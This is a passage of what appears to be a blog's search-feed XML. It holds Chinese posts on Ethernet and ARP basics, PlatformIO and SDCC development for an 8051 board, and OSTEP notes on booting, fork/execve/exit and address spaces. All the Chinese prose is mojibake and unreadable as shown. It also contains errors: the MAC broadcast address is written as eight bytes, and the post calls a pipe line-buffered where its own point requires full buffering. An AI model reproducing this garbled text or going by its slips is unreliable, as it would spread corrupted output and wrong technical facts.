class="headerlink" title="å±€åŸŸç½‘LAN"></a>å±€åŸŸç½‘LAN</h2><p>local area network</p><p>48ä½macåœ°å€ç”¨æ¥å±€åŸŸç½‘å†…å¯»å€ï¼Œç”¨äºä½¿å¸§ä»ä¸€ä¸ªç½‘å¡ä¼ é€’åˆ°ä¸å…¶ç‰©ç†è¿æ¥çš„å¦ä¸€ä¸ªç½‘å¡(ipåœ°å€ä¸»è¦æ˜¯ç”¨æ¥åšå­ç½‘è·¯ç”±ï¼Œå•ç‹¬è·¯ç”±æ¯ä¸ªipå¤ªå¤šäº†ï¼Œæ‰€æœ‰ç”¨ç½‘ç»œå·ä¸€æ ·çš„å­ç½‘è·¯ç”±)</p><p>å‰24ä½åœ°å€ç”¨æ¥è¡¨ç¤ºç¡¬ä»¶å‚å•†ç¼–å·ï¼Œå24ä¸ºè¯¥å‚å•†ç½‘å¡åºåˆ—å·</p><p>macå¹¿æ’­åœ°å€ä¸ºff ff ff ff ff ff ff ff</p><h3 id="åœ°å€è§£æåè®®"><a href="#åœ°å€è§£æåè®®" class="headerlink" title="åœ°å€è§£æåè®®"></a>åœ°å€è§£æåè®®</h3><p>address resolution protocolï¼Œarp</p><p>arpå·¥ä½œåœ¨å±€åŸŸç½‘ï¼Œå°†ipåœ°å€è§£æä¸ºmacåœ°å€</p><h3 id="ä»¥å¤ªç½‘"><a href="#ä»¥å¤ªç½‘" class="headerlink" title="ä»¥å¤ªç½‘"></a>ä»¥å¤ªç½‘</h3><p>ä»¥å¤ªç½‘å¸§ç»“æ„</p><p><img src="/2023/09/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230928183946827.png" alt="image-20230928183946827"></p><ul><li>preambleå‰åŒæ­¥ç (8å­—èŠ‚) <ul><li>å‰ä¸ƒä¸ªå­—èŠ‚ 10101010 + åä¸€ä¸ªå­—èŠ‚ 10101011</li><li>ç”¨æ¥åŒæ­¥æ¥æ”¶æ–¹å’Œå‘é€æ–¹çš„æ—¶é’Ÿé€Ÿç‡ä½¿å¾—æ¥æ”¶æ–¹å°†è‡ªå·±çš„æ—¶é’Ÿè°ƒåˆ°å‘é€ç«¯çš„æ—¶é’Ÿä»è€Œå¯ä»¥æŒ‰ç…§å‘é€ç«¯çš„æ—¶é’Ÿæ¥æ¥æ”¶æ‰€å‘é€çš„å¸§</li></ul></li><li>dest address ç›®æ ‡macåœ°å€(6å­—èŠ‚)</li><li>source address æºç›®æ ‡åœ°å€(6å­—èŠ‚)</li><li>tpyeç±»å‹(2å­—èŠ‚)<ul><li>æŒ‡å‡ºé«˜å±‚å (å¤§å¤šæƒ…å†µä¸‹æ˜¯IPï¼Œä½†ä¹Ÿæ”¯æŒå…¶å®ƒç½‘ç»œå±‚åè®® Novell IPX å’Œ AppleTalk)</li></ul></li><li>æ•°æ®data(46~1500å­—èŠ‚)<ul><li>ipæ•°æ®æŠ¥ï¼Œä»¥å¤ªç½‘æœ€å¤§ä¼ è¾“å•å…ƒMTUæœ€å¤§1500ï¼Œipæ•°æ®æŠ¥æœ€å°46å­—èŠ‚</li></ul></li><li>CRCæ ¡éªŒç (å››å­—èŠ‚)</li></ul><p>ä»¥å¤ªç½‘æä¾›æ— è¿æ¥ä¸å¯é æœåŠ¡ï¼Œcrcæ ¡éªŒä¸é€šè¿‡å°±æ‰”äº†ï¼Œä¹Ÿä¸ä¼šå‘Šè¯‰å‘é€æ–¹</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PlatformIOæ­é…clionæˆ–vscodeè¸©å‘è®°å½•</title>
      <link href="/2023/09/25/PlatformIO/"/>
      <url>/2023/09/25/PlatformIO/</url>
      
        <content type="html"><![CDATA[<p>å¥½å§ï¼Œæˆ‘æ˜¯â€œé¢œç‹—â€ï¼Œâš keilâš </p><p>ç¼ºç‚¹å°±æ˜¯ä¸æ”¯æŒè°ƒè¯•52rc <a href="https://docs.platformio.org/en/latest/boards/intel_mcs51/STC89C52RC.html#">https://docs.platformio.org/en/latest/boards/intel_mcs51/STC89C52RC.html#</a></p><p><img src="/2023/09/25/PlatformIO/image-20230926224013694.png" alt="image-20230926224013694"></p><p>sdccå…¶å®æœ‰è°ƒè¯•å·¥å…·sdcdbï¼Œä½†æˆ‘è§‰å¾—é‚£æ˜¯ä¸€å¨shit(éš¾é“æˆ‘çš„æ‰“å¼€æ–¹å¼ä¸å¯¹?)</p><h2 id="PlatformIOå¼€å‘51"><a href="#PlatformIOå¼€å‘51" class="headerlink" title="PlatformIOå¼€å‘51"></a>PlatformIOå¼€å‘51</h2><p>å®˜æ–¹æ‰‹å†Œ <a href="https://docs.platformio.org/page/projectconf.html">https://docs.platformio.org/page/projectconf.html</a></p><p>platformio.iniæ•™ç¨‹ <a href="https://www.bilibili.com/video/BV16X4y1m7AK/">https://www.bilibili.com/video/BV16X4y1m7AK/</a></p><p>platformio.ini èƒ½ç”¨é…ç½®</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[platformio]</span><br><span class="line">include_dir = C:\Users\zbx\.platformio\packages\toolchain-sdcc\include</span><br><span class="line">[env:STC89C52RC]</span><br><span class="line">platform = intel_mcs51</span><br><span class="line">board = STC89C52RC</span><br><span class="line">upload_flags =</span><br><span class="line">    -p</span><br><span class="line">    $UPLOAD_PORT</span><br><span class="line">upload_command = stcgal $UPLOAD_FLAGS $SOURCE</span><br></pre></td></tr></table></figure><p>ä¸€äº›åšå®¢æ•™ç¨‹</p><p><a href="https://nu-ll.github.io/2021/02/24/PlatformIO%E4%BD%BF%E7%94%A8%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/">https://nu-ll.github.io/2021/02/24/PlatformIO%E4%BD%BF%E7%94%A8%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/</a></p><p><a href="https://bannirui.github.io/2023/02/28/C51%E5%8D%95%E7%89%87%E6%9C%BA%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/">https://bannirui.github.io/2023/02/28/C51%E5%8D%95%E7%89%87%E6%9C%BA%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</a></p><p>åˆšå¼€å§‹è¡¥å…¨ä¸å¥½ç”¨æ”¹ä¸‹ä¸‹é¢å¤´æ–‡ä»¶</p><p>8052.h</p><p><img src="/2023/09/25/PlatformIO/image-20230926220532073.png" alt="image-20230926220532073"></p><p>8051.h</p><p><img src="/2023/09/25/PlatformIO/image-20230926220553512.png" alt="image-20230926220553512"></p><p>æ„‰å¿«è¡¥å…¨</p><p><img src="/2023/09/25/PlatformIO/image-20230926220702006.png" alt="image-20230926220702006"></p><h2 id="keilï¼Œsdccåº“ä¸åŒç‚¹"><a href="#keilï¼Œsdccåº“ä¸åŒç‚¹" class="headerlink" title="keilï¼Œsdccåº“ä¸åŒç‚¹"></a>keilï¼Œsdccåº“ä¸åŒç‚¹</h2><p>Migration Keil 2 SDCCï¼š<a href="https://www.infineon.com/dgdl/AP0806510_XC800_Migration_Keil_2_SDCC.pdf?folderId=db3a30431375fb1a01138c57204603bd&fileId=db3a304314dca389011517efc5860d61&ack=t">https://www.infineon.com/dgdl/AP0806510_XC800_Migration_Keil_2_SDCC.pdf?folderId=db3a30431375fb1a01138c57204603bd&amp;fileId=db3a304314dca389011517efc5860d61&amp;ack=t</a></p><p>sdcc manual <a href="https://sdcc.sourceforge.net/doc/sdccman.pdf">https://sdcc.sourceforge.net/doc/sdccman.pdf</a></p><p>ä¸­æ–­å›è°ƒå‡½æ•°å®šä¹‰ä¸­xæ ‡è¯†çš„æ˜¯ä¸­æ–­å·</p><p>æ¯”å¦‚</p><table><thead><tr><th>ä¸­æ–­å·</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>0</td><td>å¤–éƒ¨ä¸­æ–­0</td></tr><tr><td>1</td><td>å®šæ—¶å™¨ä¸­æ–­0</td></tr><tr><td>2</td><td>å¤–éƒ¨ä¸­æ–­1</td></tr><tr><td>3</td><td>å®šæ—¶å™¨ä¸­æ–­1</td></tr><tr><td>4</td><td>ä¸²å£ä¸­æ–­</td></tr></tbody></table><table><thead><tr><th></th><th>sdcc</th><th>keil</th></tr></thead><tbody><tr><td>å¤´æ–‡ä»¶</td><td>8052.h&#x2F;8051.h</td><td>reg52.h&#x2F;reg51.h</td></tr><tr><td>ç«¯å£æ§åˆ¶å£å®šä¹‰</td><td>#define LED1 P2_0</td><td>sbit LED1 &#x3D; P2 ^ 0;</td></tr><tr><td>ä¸­æ–­å›è°ƒå®šä¹‰</td><td>void time1() __interrupt(x) {}</td><td>void time1() interrupt 3 using 2</td></tr></tbody></table><p>keil c çš„ä¸­æ–­<br>void SerialComm(void ) interrupt 4 ;<br>{<br>}</p><p>sdcc çš„ä¸­æ–­<br>void SerialComm(void) __interrupt 4;<br>{<br>}</p><p>sdcc æ²¡æœ‰_nop()_ , å¯ç”¨å¦‚ä¸‹è‡ªå®šä¹‰å®ä»£æ›¿: #define _nop()_ __asm NOP __endasm ps: sdccé‡Œç”¨__asm xxx __endasmæ¥åšå†…è”æ±‡ç¼–</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> LED P00</span></span><br><span class="line">LED = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>è¿™ç§å®å®šä¹‰çš„æ–¹å¼åœ¨SDCCä¸­ä¸æ”¯æŒã€‚å¯ä»¥æ›¿æ¢ä¸ºä»¥ä¸‹æ–¹å¼ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> LED(x) P00=x</span></span><br><span class="line">LED(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>åœ¨åè½¬å¼•è„šæ—¶ï¼Œä¸è¦ä½¿ç”¨<strong>å–åï¼ˆP00 &#x3D; ~P00ï¼‰</strong>ï¼Œè€Œåº”è¯¥ä½¿ç”¨<strong>éï¼ˆP00 &#x3D; !P00ï¼‰</strong>è¿ç®—ï¼›å› ä¸º sdcc ä¼šé»˜è®¤è¿›è¡Œç±»å‹æå‡ï¼Œç„¶åè¿›è¡Œå–å</p><p><strong>sdccç®€å•ç¤ºä¾‹</strong> </p><p><a href="https://doc.itprojects.cn/0015-zhishi.89c51/index.html#/">https://doc.itprojects.cn/0015-zhishi.89c51/index.html#/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:13&amp;&amp;14 å†…æ ¸å¦‚ä½•å¯åŠ¨ï¼Œè¿›ç¨‹åˆ›å»ºåŠè¿›ç¨‹åœ°å€ç©ºé—´</title>
      <link href="/2023/09/23/OSTEP-13-14-Process-and-Address-Spaces/"/>
      <url>/2023/09/23/OSTEP-13-14-Process-and-Address-Spaces/</url>
      
        <content type="html"><![CDATA[<h2 id="æ“ä½œç³»ç»Ÿå¦‚ä½•å¯åŠ¨å¤§ä½“è¿‡ç¨‹"><a href="#æ“ä½œç³»ç»Ÿå¦‚ä½•å¯åŠ¨å¤§ä½“è¿‡ç¨‹" class="headerlink" title="æ“ä½œç³»ç»Ÿå¦‚ä½•å¯åŠ¨å¤§ä½“è¿‡ç¨‹"></a>æ“ä½œç³»ç»Ÿå¦‚ä½•å¯åŠ¨å¤§ä½“è¿‡ç¨‹</h2><p><strong>1.CPUä¸Šç”µè¿›è¡ŒCPU Reset</strong></p><p>ä½¿cpuæœ‰ä¸€ä¸ªå…·ä½“åˆå§‹çš„çŠ¶æ€(è¿™æ˜¯ä¸€ä¸ªè½¯ç¡¬é—´çº¦å®š)ï¼Œå¯¹äºx86æ¥è¯´ è§„èŒƒå®šä¹‰åœ¨64-ia-32-architectures-software-developer-system-ç¬¬3å·çš„Chapter 9</p><ul><li><code>CR0 = 0x60000010</code><ul><li>16-bit æ¨¡å¼</li></ul></li><li><code>EIP = 0x0000fff0 CS = 0xf000</code></li><li><code>EFLAGS = 0x00000002</code><ul><li>interrupt disabled</li></ul></li><li>â€¦â€¦â€¦</li></ul><p>qemuåˆ©ç”¨-Såœåˆ°ç¬¬ä¸€æ¡æŒ‡ä»¤å’Œæ‰‹å†Œå®Œå…¨ä¸€æ ·(å¯¹äºæ¨¡æ‹Ÿä¹Ÿå°±æ˜¯â€œæŠ„â€æ‰‹å†Œ)</p><p><img src="/2023/09/23/OSTEP-13-14-Process-and-Address-Spaces/image-20230924183932737.png" alt="image-20230924183932737"></p><p><strong>2.resetåæ‰§è¡Œäº‹å…ˆåœ¨cs:ipå¤„çš„ROMå­˜å‚¨çš„å‚å•†æä¾›çš„firmware(å›ºä»¶)ï¼Œ<code>ffff0</code> å¤„é€šå¸¸æ˜¯ä¸€æ¡å‘ firmware è·³è½¬çš„ jmp æŒ‡ä»¤</strong></p><p>firewareé‡Œæ˜¯ä¼ ç»Ÿçš„biosæˆ–è€…ç›®å‰æµè¡Œçš„uefi</p><ul><li>Legacy BIOS (Basic I&#x2F;O System)</li><li>UEFI (Unified Extensible Firmware Interface)</li><li>åŒºåˆ« <a href="https://www.zhihu.com/question/21672895">https://www.zhihu.com/question/21672895</a></li></ul><p><strong>3.å¯¹äºè¾ƒä¸ºç®€å•çš„BIOSæ¥è¯´(è™½ç„¶è¿‡æ—¶ï¼Œä½†æ˜¯è™šæ‹Ÿæœºå¥½åƒéƒ½æ˜¯ç”¨çš„bios)</strong></p><p>BIOSå…ˆç¡¬ä»¶è‡ªæ£€POST(Power-On Self Test å¼€æœºè‡ªæ£€)ï¼Œç„¶åBIOSæŠŠç¬¬ä¸€ä¸ªå¯å¼•å¯¼è®¾å¤‡(å­˜å‚¨è®¾å¤‡)çš„ç¬¬ä¸€ä¸ªæ‰‡åŒº512å­—èŠ‚åŠ è½½åˆ°ç‰©ç†å†…å­˜çš„ <code>0x7c00</code> å¤„(è¿™æ˜¯ä¸€ä¸ªçº¦å®š)ï¼Œç„¶åæŠŠpcæŒ‡å‘0x7c00(æ­¤æ—¶è¿˜æ˜¯16bitå®æ¨¡å¼)ï¼Œè¿™512ä¸ªå­—èŠ‚åˆå«ä¸»å¼•å¯¼è®°å½•(Master Boot Recordï¼ŒMBR)ï¼Œqemué‡Œçš„biosé‡‡ç”¨äº†seabios</p><ul><li>512å­—èŠ‚<ul><li>å¯åŠ¨ä»£ç  446å­—èŠ‚<ul><li>æ£€æµ‹åˆ†åŒºæ­£ç¡®æ€§</li><li>åŠ è½½å¹¶è·³è½¬åˆ°ç£ç›˜ä¸Šçš„å¼•å¯¼ç¨‹åº</li></ul></li><li>ç¡¬ç›˜åˆ†åŒºè¡¨ 64å­—èŠ‚<ul><li>æè¿°åˆ†åŒºçŠ¶æ€å’Œä½ç½®</li><li>æ¯ä¸ªåˆ†åŒºæè¿°ä¿¡æ¯å 16å­—èŠ‚</li></ul></li><li>ç»“æŸæ ‡å¿— 2å­—èŠ‚ 55AA<ul><li>ä¸»å¼•å¯¼è®°å½•çš„æœ‰æ•ˆæ ‡å¿—ï¼Œé€šè¿‡è¿™ä¸ªç¡®å®šä¸€ä¸ªè®¾å¤‡æ˜¯å¯å¼•å¯¼çš„</li></ul></li></ul></li></ul><blockquote><p>Windowsä¸ºä»€ä¹ˆä¸€èˆ¬Cç›˜æ˜¯ç³»ç»Ÿç›˜?</p><p>æ—©æœŸçš„Windowsçš„Aï¼ŒBç›˜éƒ½æ˜¯è½¯ç›˜ï¼ŒBIOSå…ˆå»è½¯ç›˜é‡Œé¢è¯»å‰512ä¸ª<code>bytes</code>ï¼Œçœ‹æœ€åä¸¤ä¸ªbyteæ˜¯å¦ä¸º<code>55aa</code>ï¼Œå¦‚æœæ˜¯å°±åŠ è½½è¿™å—ç£ç›˜ï¼Œå¦åˆ™è¯»ä¸‹ä¸€å—ï¼Œå¦‚æœéƒ½ä¸æ˜¯å°±å¯åŠ¨å¤±è´¥ã€‚è¯»å®ŒA&#x2F;Bç›˜ä¹‹åå¼•å¯¼åˆ°Cç›˜</p></blockquote><p>åšå†…æ ¸pwnæ—¶çš„å¯å¼•å¯¼å‹ç¼©é•œåƒbzImageå‰512å­—èŠ‚ bzImageè¯¦ç»†ä»‹ç»: <a href="https://gohalo.me/post/kernel-compile.html">https://gohalo.me/post/kernel-compile.html</a></p><p><img src="/2023/09/23/OSTEP-13-14-Process-and-Address-Spaces/image-20230924004155691.png" alt="image-20230924004155691"></p><p>emmï¼Œä¸ºä»€ä¹ˆä¼šæ˜¯peæ ¼å¼ï¼Œéš¾æ‡‚å“¦</p><p>è¿™512å­—èŠ‚çš„Bootloaderè¿›è¡Œä¸€ç³»åˆ—åˆå§‹åŒ–åŒ…æ‹¬æŠŠæ“ä½œç³»ç»Ÿä»£ç è½½å…¥åˆ°RAMï¼Œéšåå°†æ§åˆ¶æƒäº¤ç»™æ“ä½œç³»ç»Ÿ</p><p><strong>æ“ä½œç³»ç»Ÿå†…æ ¸çš„å¯åŠ¨ï¼šCPU Reset â†’ Firmware â†’ Boot loader â†’ Kernel_start()â†’ â€¦</strong></p><h2 id="çŠ¶æ€æœºè§†è§’ç†è§£fork-execve-exit"><a href="#çŠ¶æ€æœºè§†è§’ç†è§£fork-execve-exit" class="headerlink" title="çŠ¶æ€æœºè§†è§’ç†è§£fork execve exit"></a>çŠ¶æ€æœºè§†è§’ç†è§£fork execve exit</h2><p><strong>è¿›ç¨‹å°±æ˜¯çŠ¶æ€æœº</strong></p><h3 id="fork-å¤åˆ¶ä¸€ä¸ªä¸€æ¨¡ä¸€æ ·çš„çŠ¶æ€æœº-é™¤äº†è¿”å›å€¼å’Œpid"><a href="#fork-å¤åˆ¶ä¸€ä¸ªä¸€æ¨¡ä¸€æ ·çš„çŠ¶æ€æœº-é™¤äº†è¿”å›å€¼å’Œpid" class="headerlink" title="fork:å¤åˆ¶ä¸€ä¸ªä¸€æ¨¡ä¸€æ ·çš„çŠ¶æ€æœº(é™¤äº†è¿”å›å€¼å’Œpid)"></a>fork:å¤åˆ¶ä¸€ä¸ªä¸€æ¨¡ä¸€æ ·çš„çŠ¶æ€æœº(é™¤äº†è¿”å›å€¼å’Œpid)</h3><p><strong>fork çŠ¶æ€æœºå¤åˆ¶åŒ…æ‹¬æŒæœ‰çš„æ‰€æœ‰æ“ä½œç³»ç»Ÿå¯¹è±¡</strong></p><p>forkå®Œåè¿›å…¥å¹¶å‘ï¼Œç”±æ“ä½œç³»ç»Ÿè°ƒåº¦</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">    fork();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/tmp&gt; ./a.out</span><br><span class="line">Hello</span><br><span class="line">Hello</span><br><span class="line">Hello</span><br><span class="line">Hello</span><br><span class="line">Hello</span><br><span class="line">Hello</span><br><span class="line">grxer@Ubuntu22 ~/tmp&gt; ./a.out | wc -l</span><br><span class="line">8</span><br><span class="line">grxer@Ubuntu22 ~/tmp&gt; ./a.out | cat</span><br><span class="line">Hello</span><br><span class="line">Hello</span><br><span class="line">Hello</span><br><span class="line">Hello</span><br><span class="line">Hello</span><br><span class="line">Hello</span><br><span class="line">Hello</span><br><span class="line">Hello</span><br></pre></td></tr></table></figure><p>é€ æˆè¿™ç§å¥‡æ€ªç°è±¡çš„åŸå› ç»ˆç«¯çš„stdoutæ˜¯linebufferï¼Œè€Œç®¡é“æ˜¯linebuffer</p><p><code>linebuffer</code>ï¼šé‡åˆ°<code>\n</code>å°†ç¼“å†²åŒºçš„å†…å®¹è¾“å‡º</p><p><code>fullbuffer</code>ï¼šåˆ°è¾¾è®¾å®šå®¹é‡åæ‰ä¼šå°†ç¼“å†²åŒºçš„å†…å®¹è¾“å‡º</p><p>å¯¹äºfullbufferåœ¨forkæ—¶ç¼“å†²åŒºé‡Œæ˜¯æœ‰â€œHelloâ€çš„ï¼Œä¼šè¢«å¤åˆ¶åˆ°æ–°çš„çŠ¶æ€æœº</p><h3 id="execve-å°†å½“å‰è¿è¡Œçš„çŠ¶æ€æœºé‡ç½®æˆå¦ä¸€ä¸ªç¨‹åºçš„åˆå§‹çŠ¶æ€"><a href="#execve-å°†å½“å‰è¿è¡Œçš„çŠ¶æ€æœºé‡ç½®æˆå¦ä¸€ä¸ªç¨‹åºçš„åˆå§‹çŠ¶æ€" class="headerlink" title="execve:å°†å½“å‰è¿è¡Œçš„çŠ¶æ€æœºé‡ç½®æˆå¦ä¸€ä¸ªç¨‹åºçš„åˆå§‹çŠ¶æ€"></a>execve:å°†å½“å‰è¿è¡Œçš„çŠ¶æ€æœºé‡ç½®æˆå¦ä¸€ä¸ªç¨‹åºçš„åˆå§‹çŠ¶æ€</h3><p><strong>execve â€œé‡ç½®â€ çŠ¶æ€æœºï¼Œä½†ç»§æ‰¿æŒæœ‰çš„æ‰€æœ‰æ“ä½œç³»ç»Ÿå¯¹è±¡(æ–‡ä»¶æè¿°ç¬¦ç­‰)</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> * <span class="type">const</span> argv[] = &#123;</span><br><span class="line">    <span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="literal">NULL</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="type">char</span> * <span class="type">const</span> envp[] = &#123;</span><br><span class="line">    <span class="string">&quot;HELLO=WORLD&quot;</span>, <span class="literal">NULL</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  execve(argv[<span class="number">0</span>], argv, envp);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, World!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/tmp&gt; ./a.out</span><br><span class="line">PWD=/home/grxer/tmp</span><br><span class="line">HELLO=WORLD</span><br><span class="line">SHLVL=0</span><br><span class="line">_=/usr/bin/env</span><br></pre></td></tr></table></figure><p>execveçŠ¶æ€æœºè¢«é‡ç½®ï¼Œç¯å¢ƒå˜é‡å˜äº†ï¼Œprintfæ²¡è¢«æ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/tmp&gt; strace ./a.out &amp;| grep execve</span><br><span class="line">execve(&quot;./a.out&quot;, [&quot;./a.out&quot;], 0x7ffc2b593b20 /* 56 vars */) = 0</span><br><span class="line">execve(&quot;/bin/bash&quot;, [&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;env&quot;], 0x7fffa6c12100 /* 1 var */) = 0</span><br><span class="line">execve(&quot;/usr/bin/env&quot;, [&quot;env&quot;], 0x561b43500700 /* 4 vars */) = 0</span><br></pre></td></tr></table></figure><blockquote><p>straceç”¨çš„stderrè¾“å‡ºï¼Œä¸ªäººç”¨çš„fishï¼Œfishé‡Œçš„<a href="https://fishshell.com/docs/current/language.html?highlight=control%20operator#:~:text=As%20a%20convenience%2C%20the%20pipe%20%26%7C%20redirects%20both%20stdout%20and%20stderr%20to%20the%20same%20process.%20This%20is%20different%20from%20bash%2C%20which%20uses%20%7C%26.">&amp;|</a>ç­‰äºbashé‡Œçš„|&amp;ï¼Œç­‰ä»·äº 2&gt;&amp;1 å°†stderré‡å®šå‘åˆ°stdout</p></blockquote><h3 id="exit-é”€æ¯çŠ¶æ€æœº"><a href="#exit-é”€æ¯çŠ¶æ€æœº" class="headerlink" title="exit:é”€æ¯çŠ¶æ€æœº"></a>exit:é”€æ¯çŠ¶æ€æœº</h3><ul><li><code>exit(0)</code> <code>stdlib.h</code> ä¸­å£°æ˜çš„<code>libc</code>å‡½æ•°<ul><li>ä¼šè°ƒç”¨ <code>atexit</code></li><li>libcåšä¸€ç³»åˆ—ç”¨æˆ·å±‚é¢æ¸…é™¤(é‡Šæ”¾TLSï¼Œæ¸…é™¤ç¼“å†²åŒºç­‰ç­‰)åè°ƒç”¨<code>_exit(0)</code>åšå†…æ ¸å±‚é¢æ¸…é™¤</li></ul></li><li><code>_exit(0)</code> - glibc çš„ syscall wrapper<ul><li>æ‰§è¡Œ â€œ<code>exit_group</code>â€ ç³»ç»Ÿè°ƒç”¨ç»ˆæ­¢<strong>æ•´ä¸ªè¿›ç¨‹(æ‰€æœ‰çº¿ç¨‹)</strong></li><li>ä¸ä¼šè°ƒç”¨ <code>atexit</code></li></ul></li><li><code>syscall(SYS_exit, 0)</code><ul><li>æ‰§è¡Œ â€œ<code>exit</code>â€ ç³»ç»Ÿè°ƒç”¨ç»ˆæ­¢<strong>å½“å‰çº¿ç¨‹</strong></li><li>ä¸ä¼šè°ƒç”¨ <code>atexit</code></li></ul></li></ul><h3 id="æ“ä½œç³»ç»Ÿå¯åŠ¨å"><a href="#æ“ä½œç³»ç»Ÿå¯åŠ¨å" class="headerlink" title="æ“ä½œç³»ç»Ÿå¯åŠ¨å"></a>æ“ä½œç³»ç»Ÿå¯åŠ¨å</h3><p>æ§åˆ¶æƒç»™åˆ°æ“ä½œç³»ç»Ÿåï¼Œæ“ä½œç³»ç»Ÿä¼šå¯åŠ¨ä¸€ä¸ªè¿›ç¨‹(è¿™ä¸ªè¿›ç¨‹å¿…é¡»æ˜¯ä¸€ä¸ªç±»ä¼¼whileå¾ªç¯çš„æ— ç»ˆæ­¢)ï¼ŒéšåKernelå°±è¿›å…¥åå°ï¼Œæˆä¸º â€œä¸­æ–­&#x2F;å¼‚å¸¸å¤„ç†ç¨‹åºâ€</p><p>å¯¹äºæˆ‘ä»¬linuxæ¥è¯´ä¼šä»ä¸‹é¢å‡ ä¸ªè·¯å¾„å°è¯•åˆ›å»ºinitè¿›ç¨‹ <a href="https://elixir.bootlin.com/linux/latest/source/init/main.c#L1493">https://elixir.bootlin.com/linux/latest/source/init/main.c#L1493</a></p><p><img src="/2023/09/23/OSTEP-13-14-Process-and-Address-Spaces/image-20230924013930964.png" alt="image-20230924013930964"></p><p><img src="/2023/09/23/OSTEP-13-14-Process-and-Address-Spaces/image-20230924014144178.png" alt="image-20230924014144178"></p><p>éšåç”±initè¿›ç¨‹åˆ©ç”¨fork execve exitä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨è¿›è¡Œé•¿ä¹…çš„çŠ¶æ€æœºå¤åˆ¶ï¼Œé‡ç½®ï¼Œç»ˆæ­¢ï¼Œé…åˆå…¶ä»–ç³»ç»Ÿè°ƒç”¨åˆ›é€ æ•´ä¸ªæ“ä½œç³»ç»Ÿä¸–ç•Œ</p><h2 id="è¿›ç¨‹åœ°å€ç©ºé—´"><a href="#è¿›ç¨‹åœ°å€ç©ºé—´" class="headerlink" title="è¿›ç¨‹åœ°å€ç©ºé—´"></a>è¿›ç¨‹åœ°å€ç©ºé—´</h2><p>æµ‹è¯•ç¨‹åºåŠ¨æ€é“¾æ¥</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>åœ°å€ç©ºé—´</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">555555554000-555555555000 r--p 00000000 08:03 4983575                    /home/grxer/tmp/a.out</span><br><span class="line">555555555000-555555556000 r-xp 00001000 08:03 4983575                    /home/grxer/tmp/a.out</span><br><span class="line">555555556000-555555557000 r--p 00002000 08:03 4983575                    /home/grxer/tmp/a.out</span><br><span class="line">555555557000-555555558000 r--p 00002000 08:03 4983575                    /home/grxer/tmp/a.out</span><br><span class="line">555555558000-555555559000 rw-p 00003000 08:03 4983575                    /home/grxer/tmp/a.out</span><br><span class="line">7ffff7c00000-7ffff7c28000 r--p 00000000 08:03 2885986                    /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7ffff7c28000-7ffff7dbd000 r-xp 00028000 08:03 2885986                    /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7ffff7dbd000-7ffff7e15000 r--p 001bd000 08:03 2885986                    /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7ffff7e15000-7ffff7e19000 r--p 00214000 08:03 2885986                    /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7ffff7e19000-7ffff7e1b000 rw-p 00218000 08:03 2885986                    /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7ffff7e1b000-7ffff7e28000 rw-p 00000000 00:00 0                             